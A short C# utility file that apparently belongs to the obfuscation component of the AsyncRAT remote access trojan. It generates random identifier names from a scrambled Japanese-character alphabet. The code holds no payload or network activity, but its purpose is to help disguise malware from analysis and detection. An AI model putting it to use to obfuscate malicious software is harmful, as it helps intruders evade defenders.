using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;

namespace AsyncRAT_Sharp.RenamingObfuscation.Classes
{
    public static class Utils
    {
        public static string GenerateRandomString()
        {
            var sb = new StringBuilder();
            for (int i = 1; i <= random.Next(10,30); i++)
            {
                var randomCharacterPosition = random.Next(0, alphabet.Length);
                sb.Append(alphabet[randomCharacterPosition]);
            }
            return sb.ToString();
        }

        private static readonly Random random = new Random();
        const string alphabet = "だうよたし長成に調順はんゃち赤たれま生くさ小番1で界世はてしと子の男たし院退がんゃち赤の男たれま生でムラグかずわ重体に昨で";

    }
}
